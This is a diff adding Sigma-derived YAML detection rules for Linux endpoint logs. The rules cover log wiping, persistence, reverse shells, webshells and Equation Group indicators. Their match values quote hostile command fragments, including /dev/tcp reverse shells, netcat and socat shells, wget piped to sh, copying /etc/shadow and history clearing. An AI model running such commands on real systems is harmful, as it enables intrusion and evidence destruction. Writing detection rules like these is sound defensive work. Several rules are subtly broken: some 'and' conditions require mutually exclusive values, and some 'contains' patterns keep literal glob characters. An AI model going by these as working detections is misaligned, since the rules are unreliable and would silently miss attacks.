+- id: lr-sigma-imported-97954cda
+  title: Clear or Disable Kernel Ring Buffer Logs via Syslog Syscall
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects the use of the `syslog` syscall with action code 5 (SYSLOG_ACTION_CLEAR),
+    (4 is SYSLOG_ACTION_READ_CLEAR and 6 is SYSLOG_ACTION_CONSOLE_OFF) which clears
+    the kernel ring buffer (dmesg [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: SYSCALL
+    - field: extra.SYSCALL
+      op: contains
+      value: syslog
+    - field: extra.a0
+      op: contains_any
+      values:
+      - '4'
+      - '5'
+      - '6'
+    condition_logic: and
+  mitre_technique_id: T1070.002
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-5288573f
+  title: Creation Of An User Account
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects the creation of a new user account. Such accounts may be used
+    for persistence that do not require persistent remote access tools to be deployed
+    on the system.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: SYSCALL
+    - field: extra.exe
+      op: endswith
+      value: /useradd
+    - field: extra.type
+      op: contains
+      value: ADD_USER
+    condition_logic: or
+  mitre_technique_id: T1136.001
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-ec12a0a9
+  title: Loading of Kernel Module via Insmod
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects loading of kernel modules with insmod command. Loadable Kernel
+    Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel
+    upon demand. Adversaries may use LKMs to [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: SYSCALL
+    - field: extra.comm
+      op: contains
+      value: insmod
+    - field: extra.exe
+      op: contains
+      value: /usr/bin/kmod
+    condition_logic: and
+  mitre_technique_id: T1547.006
+  mitre_tactic: privilege-escalation
+  flag: privilege_escalation
+- id: lr-sigma-imported-1434116f
+  title: Linux Network Service Scanning - Auditd
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects enumeration of local or remote network services.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: SYSCALL
+    - field: extra.exe
+      op: contains_any
+      values:
+      - /telnet
+      - /nmap
+      - /netcat
+      - /nc
+      - /ncat
+      - /nc.openbsd
+    - field: extra.key
+      op: contains
+      value: network_connect_4
+    condition_logic: and
+  mitre_technique_id: T1046
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-27ed6d6c
+  title: Split A File Into Pieces - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detection use of the command "split" to split files into parts and
+    possible transfer.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: SYSCALL
+    - field: extra.comm
+      op: contains
+      value: split
+    condition_logic: and
+  mitre_technique_id: T1030
+  mitre_tactic: exfiltration
+  flag: data_exfil_candidate
+- id: lr-sigma-imported-f05ef69f
+  title: System Info Discovery via Sysinfo Syscall
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects use of the sysinfo system call in Linux, which provides a snapshot
+    of key system statistics such as uptime, load averages, memory usage, and the
+    number of running processes. Malware or [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: SYSCALL
+    - field: extra.SYSCALL
+      op: contains
+      value: sysinfo
+    condition_logic: and
+  mitre_technique_id: T1057
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-a899c9ad
+  title: Program Executions in Suspicious Folders
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects program executions in suspicious non-program folders related
+    to malware or hacking activity
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: SYSCALL
+    - field: extra.exe
+      op: contains_any
+      values:
+      - /tmp/
+      - /var/www/
+      - /home/*/public_html/
+      - /usr/local/apache2/
+      - /usr/local/httpd/
+      - /var/apache/
+      - /srv/www/
+      - /home/httpd/html/
+      - /srv/http/
+      - /usr/share/nginx/html/
+      - /var/lib/pgsql/data/
+      - /usr/local/mysql/data/
+      - /var/lib/mysql/
+      - /var/vsftpd/
+      - /etc/bind/
+      - /var/named/
+    condition_logic: and
+  mitre_technique_id: T1587
+  mitre_tactic: resource-development
+- id: lr-sigma-imported-8f63afad
+  title: Special File Creation via Mknod Syscall
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects usage of the `mknod` syscall to create special files (e.g.,
+    character or block devices). Attackers or malware might use `mknod` to create
+    fake devices, interact with kernel interfaces, [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: SYSCALL
+    - field: extra.SYSCALL
+      op: contains
+      value: mknod
+    condition_logic: and
+  mitre_technique_id: T1543.003
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-5d316b69
+  title: Webshell Remote Command Execution
+  source: sigma
+  log_type: linux_endpoint
+  severity: critical
+  description: Detects possible command execution by web application/web shell
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: SYSCALL
+    - field: extra.SYSCALL
+      op: contains_any
+      values:
+      - execve
+      - execveat
+    - field: extra.euid
+      op: contains
+      value: '33'
+    condition_logic: and
+  mitre_technique_id: T1505.003
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-52f429fa
+  title: Relevant ClamAV Message
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects relevant ClamAV messages
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: Trojan*FOUND
+    - field: raw_message
+      op: contains
+      value: VirTool*FOUND
+    - field: raw_message
+      op: contains
+      value: Webshell*FOUND
+    - field: raw_message
+      op: contains
+      value: Rootkit*FOUND
+    - field: raw_message
+      op: contains
+      value: Htran*FOUND
+    condition_logic: or
+  mitre_technique_id: T1588.001
+  mitre_tactic: resource-development
+- id: lr-sigma-imported-f560e890
+  title: Modifying Crontab
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects suspicious modification of crontab file.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: REPLACE
+    condition_logic: or
+  mitre_technique_id: T1053.003
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-618bb1d4
+  title: Guacamole Two Users Sharing Session Anomaly
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects suspicious session with two users present
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: (2 users now present)
+    condition_logic: and
+  mitre_technique_id: T1212
+  mitre_tactic: credential-access
+  flag: credential_access
+- id: lr-sigma-imported-56ba898b
+  title: Equation Group Indicators
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects suspicious shell commands used in various Equation Group scripts
+    and tools
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: 'chown root*chmod 4777 '
+    - field: raw_message
+      op: contains
+      value: cp /bin/sh .;chown
+    - field: raw_message
+      op: contains
+      value: chmod 4777 /tmp/.scsi/dev/bin/gsh
+    - field: raw_message
+      op: contains
+      value: chown root:root /tmp/.scsi/dev/bin/
+    - field: raw_message
+      op: contains
+      value: chown root:root x;
+    - field: raw_message
+      op: contains
+      value: /bin/telnet locip locport < /dev/console | /bin/sh
+    - field: raw_message
+      op: contains
+      value: /tmp/ratload
+    - field: raw_message
+      op: contains
+      value: 'ewok -t '
+    - field: raw_message
+      op: contains
+      value: 'xspy -display '
+    - field: raw_message
+      op: contains
+      value: cat > /dev/tcp/127.0.0.1/80 <<END
+    - field: raw_message
+      op: contains
+      value: rm -f /current/tmp/ftshell.latest
+    - field: raw_message
+      op: contains
+      value: 'ghost_* -v '
+    - field: raw_message
+      op: contains
+      value: ' --wipe > /dev/null'
+    - field: raw_message
+      op: contains
+      value: ping -c 2 *; grep * /proc/net/arp >/tmp/gx
+    - field: raw_message
+      op: contains
+      value: iptables * OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;
+    - field: raw_message
+      op: contains
+      value: '> /var/log/audit/audit.log; rm -f .'
+    - field: raw_message
+      op: contains
+      value: cp /var/log/audit/audit.log .tmp
+    - field: raw_message
+      op: contains
+      value: sh >/dev/tcp/* <&1 2>&1
+    - field: raw_message
+      op: contains
+      value: ncat -vv -l -p * <
+    - field: raw_message
+      op: contains
+      value: nc -vv -l -p * <
+    - field: raw_message
+      op: contains
+      value: < /dev/console | uudecode && uncompress
+    - field: raw_message
+      op: contains
+      value: sendmail -osendmail;chmod +x sendmail
+    - field: raw_message
+      op: contains
+      value: /usr/bin/wget -O /tmp/a http* && chmod 755 /tmp/cron
+    - field: raw_message
+      op: contains
+      value: chmod 666 /var/run/utmp~
+    - field: raw_message
+      op: contains
+      value: chmod 700 nscd crond
+    - field: raw_message
+      op: contains
+      value: cp /etc/shadow /tmp/.
+    - field: raw_message
+      op: contains
+      value: </dev/console |uudecode > /dev/null 2>&1 && uncompress
+    - field: raw_message
+      op: contains
+      value: chmod 700 jp&&netstat -an|grep
+    - field: raw_message
+      op: contains
+      value: uudecode > /dev/null 2>&1 && uncompress -f * && chmod 755
+    - field: raw_message
+      op: contains
+      value: chmod 700 crond
+    - field: raw_message
+      op: contains
+      value: wget http*; chmod +x /tmp/sendmail
+    - field: raw_message
+      op: contains
+      value: chmod 700 fp sendmail pt
+    - field: raw_message
+      op: contains
+      value: chmod 755 /usr/vmsys/bin/pipe
+    - field: raw_message
+      op: contains
+      value: chmod -R 755 /usr/vmsys
+    - field: raw_message
+      op: contains
+      value: chmod 755 $opbin/*tunnel
+    - field: raw_message
+      op: contains
+      value: chmod 700 sendmail
+    - field: raw_message
+      op: contains
+      value: chmod 0700 sendmail
+    - field: raw_message
+      op: contains
+      value: /usr/bin/wget http*sendmail;chmod +x sendmail;
+    - field: raw_message
+      op: contains
+      value: '&& telnet * 2>&1 </dev/console'
+    condition_logic: or
+  mitre_technique_id: T1059.004
+- id: lr-sigma-imported-b8caead0
+  title: Buffer Overflow Attempts
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects buffer overflow attempts in Unix system log files
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: attempt to execute code on stack by
+    - field: raw_message
+      op: contains
+      value: 0bin0sh1
+    - field: raw_message
+      op: contains
+      value: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    - field: raw_message
+      op: contains
+      value: stack smashing detected
+    condition_logic: or
+  mitre_technique_id: T1068
+  mitre_tactic: privilege-escalation
+  flag: privilege_escalation
+- id: lr-sigma-imported-0551b737
+  title: Commands to Clear or Remove the Syslog - Builtin
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects specific commands commonly used to remove or empty the syslog
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: rm /var/log/syslog
+    - field: raw_message
+      op: contains
+      value: rm -r /var/log/syslog
+    - field: raw_message
+      op: contains
+      value: rm -f /var/log/syslog
+    - field: raw_message
+      op: contains
+      value: rm -rf /var/log/syslog
+    - field: raw_message
+      op: contains
+      value: mv /var/log/syslog
+    - field: raw_message
+      op: contains
+      value: ' >/var/log/syslog'
+    - field: raw_message
+      op: contains
+      value: ' > /var/log/syslog'
+    condition_logic: and
+  mitre_technique_id: T1565.001
+  mitre_tactic: impact
+  flag: suspicious_process
+- id: lr-sigma-imported-cc5601ff
+  title: Remote File Copy
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects the use of tools that copy files from or to remote systems
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: 'scp '
+    - field: raw_message
+      op: contains
+      value: 'rsync '
+    - field: raw_message
+      op: contains
+      value: 'sftp '
+    condition_logic: and
+  mitre_technique_id: T1105
+  mitre_tactic: lateral-movement
+  flag: lateral_movement_candidate
+- id: lr-sigma-imported-939a1460
+  title: Code Injection by ld.so Preload
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the ld.so preload persistence file. See `man ld.so` for more
+    information.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: /etc/ld.so.preload
+    condition_logic: or
+  mitre_technique_id: T1574.006
+  mitre_tactic: privilege-escalation
+  flag: privilege_escalation
+- id: lr-sigma-imported-55d5f859
+  title: Potential Suspicious BPF Activity - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the presence of "bpf_probe_write_user" BPF helper-generated
+    warning messages. Which could be a sign of suspicious eBPF activity on the system.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: bpf_probe_write_user
+    condition_logic: and
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-4694decb
+  title: Privileged User Has Been Created
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the addition of a new user to a privileged group such as "root"
+    or "sudo"
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: new user
+    - field: raw_message
+      op: contains
+      value: GID=0,
+    - field: raw_message
+      op: contains
+      value: UID=0,
+    - field: raw_message
+      op: contains
+      value: GID=10,
+    - field: raw_message
+      op: contains
+      value: GID=27,
+    condition_logic: and
+  mitre_technique_id: T1136.001
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-e81b4d8f
+  title: Linux Command History Tampering
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects commands that try to clear or tamper with the Linux command
+    history. This technique is used by threat actors in order to evade defenses and
+    execute commands without them being recorded [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: cat /dev/null >*sh_history
+    - field: raw_message
+      op: contains
+      value: cat /dev/zero >*sh_history
+    - field: raw_message
+      op: contains
+      value: chattr +i*sh_history
+    - field: raw_message
+      op: contains
+      value: echo "" >*sh_history
+    - field: raw_message
+      op: contains
+      value: empty_bash_history
+    - field: raw_message
+      op: contains
+      value: export HISTFILESIZE=0
+    - field: raw_message
+      op: contains
+      value: history -c
+    - field: raw_message
+      op: contains
+      value: history -w
+    - field: raw_message
+      op: contains
+      value: ln -sf /dev/null *sh_history
+    - field: raw_message
+      op: contains
+      value: ln -sf /dev/zero *sh_history
+    - field: raw_message
+      op: contains
+      value: rm *sh_history
+    - field: raw_message
+      op: contains
+      value: shopt -ou history
+    - field: raw_message
+      op: contains
+      value: shopt -uo history
+    - field: raw_message
+      op: contains
+      value: shred *sh_history
+    - field: raw_message
+      op: contains
+      value: truncate -s0 *sh_history
+    condition_logic: or
+  mitre_technique_id: T1070.003
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-cb83c1f0
+  title: Suspicious Activity in Shell Commands
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects suspicious shell commands used in various exploit codes (see
+    references)
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: wget * - http* | perl
+    - field: raw_message
+      op: contains
+      value: wget * - http* | sh
+    - field: raw_message
+      op: contains
+      value: wget * - http* | bash
+    - field: raw_message
+      op: contains
+      value: python -m SimpleHTTPServer
+    - field: raw_message
+      op: contains
+      value: -m http.server
+    - field: raw_message
+      op: contains
+      value: import pty; pty.spawn*
+    - field: raw_message
+      op: contains
+      value: socat exec:*
+    - field: raw_message
+      op: contains
+      value: socat -O /tmp/*
+    - field: raw_message
+      op: contains
+      value: socat tcp-connect*
+    - field: raw_message
+      op: contains
+      value: '*echo binary >>*'
+    - field: raw_message
+      op: contains
+      value: '*wget *; chmod +x*'
+    - field: raw_message
+      op: contains
+      value: '*wget *; chmod 777 *'
+    - field: raw_message
+      op: contains
+      value: '*cd /tmp || cd /var/run || cd /mnt*'
+    - field: raw_message
+      op: contains
+      value: '*stop;service iptables stop;*'
+    - field: raw_message
+      op: contains
+      value: '*stop;SuSEfirewall2 stop;*'
+    - field: raw_message
+      op: contains
+      value: chmod 777 2020*
+    - field: raw_message
+      op: contains
+      value: '*>>/etc/rc.local'
+    - field: raw_message
+      op: contains
+      value: '*base64 -d /tmp/*'
+    - field: raw_message
+      op: contains
+      value: '* | base64 -d *'
+    - field: raw_message
+      op: contains
+      value: '*/chmod u+s *'
+    - field: raw_message
+      op: contains
+      value: '*chmod +s /tmp/*'
+    - field: raw_message
+      op: contains
+      value: '*chmod u+s /tmp/*'
+    - field: raw_message
+      op: contains
+      value: '* /tmp/haxhax*'
+    - field: raw_message
+      op: contains
+      value: '* /tmp/ns_sploit*'
+    - field: raw_message
+      op: contains
+      value: nc -l -p *
+    - field: raw_message
+      op: contains
+      value: cp /bin/ksh *
+    - field: raw_message
+      op: contains
+      value: cp /bin/sh *
+    - field: raw_message
+      op: contains
+      value: '* /tmp/*.b64 *'
+    - field: raw_message
+      op: contains
+      value: '*/tmp/ysocereal.jar*'
+    - field: raw_message
+      op: contains
+      value: '*/tmp/x *'
+    - field: raw_message
+      op: contains
+      value: '*; chmod +x /tmp/*'
+    - field: raw_message
+      op: contains
+      value: '*;chmod +x /tmp/*'
+    condition_logic: or
+  mitre_technique_id: T1059.004
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-21e96d75
+  title: Suspicious Log Entries
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects suspicious log entries in Linux log files
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: entered promiscuous mode
+    - field: raw_message
+      op: contains
+      value: Deactivating service
+    - field: raw_message
+      op: contains
+      value: Oversized packet received from
+    - field: raw_message
+      op: contains
+      value: imuxsock begins to drop messages
+    condition_logic: or
+  mitre_tactic: impact
+  flag: suspicious_process
+- id: lr-sigma-imported-d7886588
+  title: Suspicious Reverse Shell Command Line
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects suspicious shell commands or program code that may be executed
+    or used in command line to establish a reverse shell
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: BEGIN {s = "/inet/tcp/0/
+    - field: raw_message
+      op: contains
+      value: bash -i >& /dev/tcp/
+    - field: raw_message
+      op: contains
+      value: bash -i >& /dev/udp/
+    - field: raw_message
+      op: contains
+      value: sh -i >$ /dev/udp/
+    - field: raw_message
+      op: contains
+      value: sh -i >$ /dev/tcp/
+    - field: raw_message
+      op: contains
+      value: '&& while read line 0<&5; do'
+    - field: raw_message
+      op: contains
+      value: /bin/bash -c exec 5<>/dev/tcp/
+    - field: raw_message
+      op: contains
+      value: /bin/bash -c exec 5<>/dev/udp/
+    - field: raw_message
+      op: contains
+      value: 'nc -e /bin/sh '
+    - field: raw_message
+      op: contains
+      value: /bin/sh | nc
+    - field: raw_message
+      op: contains
+      value: 'rm -f backpipe; mknod /tmp/backpipe p && nc '
+    - field: raw_message
+      op: contains
+      value: ;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))
+    - field: raw_message
+      op: contains
+      value: ;STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;
+    - field: raw_message
+      op: contains
+      value: /bin/sh -i <&3 >&3 2>&3
+    - field: raw_message
+      op: contains
+      value: uname -a; w; id; /bin/bash -i
+    - field: raw_message
+      op: contains
+      value: $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);
+        $stream.Flush()};
+    - field: raw_message
+      op: contains
+      value: ;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');
+    - field: raw_message
+      op: contains
+      value: .to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
+    - field: raw_message
+      op: contains
+      value: ;while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print
+    - field: raw_message
+      op: contains
+      value: 'socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:'
+    - field: raw_message
+      op: contains
+      value: rm -f /tmp/p; mknod /tmp/p p &&
+    - field: raw_message
+      op: contains
+      value: ' | /bin/bash | telnet '
+    - field: raw_message
+      op: contains
+      value: ',echo=0,raw tcp-listen:'
+    - field: raw_message
+      op: contains
+      value: 'nc -lvvp '
+    - field: raw_message
+      op: contains
+      value: xterm -display 1
+    condition_logic: or
+  mitre_technique_id: T1059.004
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-ce4cf136
+  title: Shellshock Expression
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects shellshock expressions in log files
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: (){:;};
+    - field: raw_message
+      op: contains
+      value: () {:;};
+    - field: raw_message
+      op: contains
+      value: () { :;};
+    - field: raw_message
+      op: contains
+      value: () { :; };
+    condition_logic: or
+  mitre_technique_id: T1505.003
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-609bcfa2
+  title: Suspicious Use of /dev/tcp
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects suspicious command with /dev/tcp
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: cat </dev/tcp/
+    - field: raw_message
+      op: contains
+      value: exec 3<>/dev/tcp/
+    - field: raw_message
+      op: contains
+      value: echo >/dev/tcp/
+    - field: raw_message
+      op: contains
+      value: bash -i >& /dev/tcp/
+    - field: raw_message
+      op: contains
+      value: sh -i >& /dev/udp/
+    - field: raw_message
+      op: contains
+      value: 0<&196;exec 196<>/dev/tcp/
+    - field: raw_message
+      op: contains
+      value: exec 5<>/dev/tcp/
+    - field: raw_message
+      op: contains
+      value: (sh)0>/dev/tcp/
+    - field: raw_message
+      op: contains
+      value: bash -c 'bash -i >& /dev/tcp/
+    - field: raw_message
+      op: contains
+      value: echo -e '#!/bin/bash\nbash -i >& /dev/tcp/
+    condition_logic: or
+  mitre_tactic: reconnaissance
+  flag: recon_candidate
+- id: lr-sigma-imported-3c8b4bf1
+  title: Symlink Etc Passwd
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects suspicious command lines that look as if they would create
+    symbolic links to /etc/passwd
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: ln -s -f /etc/passwd
+    - field: raw_message
+      op: contains
+      value: ln -s /etc/passwd
+    condition_logic: or
+  mitre_technique_id: T1204.001
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-66477015
+  title: Suspicious OpenSSH Daemon Error
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects suspicious SSH / SSHD error messages that indicate a fatal
+    or suspicious error that could be caused by exploiting attempts
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: unexpected internal error
+    - field: raw_message
+      op: contains
+      value: unknown or unsupported key type
+    - field: raw_message
+      op: contains
+      value: invalid certificate signing key
+    - field: raw_message
+      op: contains
+      value: invalid elliptic curve value
+    - field: raw_message
+      op: contains
+      value: incorrect signature
+    - field: raw_message
+      op: contains
+      value: error in libcrypto
+    - field: raw_message
+      op: contains
+      value: unexpected bytes remain after decoding
+    - field: raw_message
+      op: contains
+      value: 'fatal: buffer_get_string: bad string'
+    - field: raw_message
+      op: contains
+      value: 'Local: crc32 compensation attack'
+    - field: raw_message
+      op: contains
+      value: bad client public DH value
+    - field: raw_message
+      op: contains
+      value: Corrupted MAC on input
+    condition_logic: or
+  mitre_technique_id: T1190
+  mitre_tactic: initial-access
+  flag: injection_attempt
+- id: lr-sigma-imported-2b8d2ff7
+  title: Disabling Security Tools - Builtin
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects disabling security tools
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: stopping iptables
+    - field: raw_message
+      op: contains
+      value: stopping ip6tables
+    - field: raw_message
+      op: contains
+      value: stopping firewalld
+    - field: raw_message
+      op: contains
+      value: stopping cbdaemon
+    - field: raw_message
+      op: contains
+      value: stopping falcon-sensor
+    condition_logic: or
+  mitre_technique_id: T1562.004
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-d5a362c7
+  title: Suspicious Named Error
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects suspicious DNS error messages that indicate a fatal or suspicious
+    error that could be caused by exploiting attempts
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: ' dropping source port zero packet from '
+    - field: raw_message
+      op: contains
+      value: ' denied AXFR from '
+    - field: raw_message
+      op: contains
+      value: ' exiting (due to fatal error)'
+    condition_logic: or
+  mitre_technique_id: T1190
+  mitre_tactic: initial-access
+  flag: injection_attempt
+- id: lr-sigma-imported-fd9798d3
+  title: Suspicious VSFTPD Error Messages
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects suspicious VSFTPD error messages that indicate a fatal or suspicious
+    error that could be caused by exploiting attempts
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: raw_message
+      op: contains
+      value: 'Connection refused: too many sessions for this address.'
+    - field: raw_message
+      op: contains
+      value: 'Connection refused: tcp_wrappers denial.'
+    - field: raw_message
+      op: contains
+      value: Bad HTTP verb.
+    - field: raw_message
+      op: contains
+      value: port and pasv both active
+    - field: raw_message
+      op: contains
+      value: pasv and port both active
+    - field: raw_message
+      op: contains
+      value: Transfer done (but failed to open directory).
+    - field: raw_message
+      op: contains
+      value: Could not set file modification time.
+    - field: raw_message
+      op: contains
+      value: 'bug: pid active in ptrace_sandbox_free'
+    - field: raw_message
+      op: contains
+      value: PTRACE_SETOPTIONS failure
+    - field: raw_message
+      op: contains
+      value: 'weird status:'
+    - field: raw_message
+      op: contains
+      value: couldn't handle sandbox event
+    - field: raw_message
+      op: contains
+      value: syscall * out of bounds
+    - field: raw_message
+      op: contains
+      value: 'syscall not permitted:'
+    - field: raw_message
+      op: contains
+      value: 'syscall validate failed:'
+    - field: raw_message
+      op: contains
+      value: Input line too long.
+    - field: raw_message
+      op: contains
+      value: poor buffer accounting in str_netfd_alloc
+    - field: raw_message
+      op: contains
+      value: vsf_sysutil_read_loop
+    condition_logic: or
+  mitre_technique_id: T1190
+  mitre_tactic: initial-access
+  flag: injection_attempt
+- id: lr-sigma-imported-857febe9
+  title: Linux Doas Conf File Creation
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects the creation of doas.conf file in linux host platform.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.TargetFilename
+      op: endswith
+      value: /etc/doas.conf
+    condition_logic: and
+  mitre_technique_id: T1548
+  mitre_tactic: privilege-escalation
+  flag: privilege_escalation
+- id: lr-sigma-imported-c6a0bb91
+  title: Persistence Via Cron Files
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects creation of cron file or files in Cron directories which could
+    indicates potential persistence.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.TargetFilename
+      op: contains_any
+      values:
+      - /etc/cron.d/
+      - /etc/cron.daily/
+      - /etc/cron.hourly/
+      - /etc/cron.monthly/
+      - /etc/cron.weekly/
+      - /var/spool/cron/crontabs/
+    - field: extra.TargetFilename
+      op: contains_any
+      values:
+      - /etc/cron.allow
+      - /etc/cron.deny
+      - /etc/crontab
+    condition_logic: or
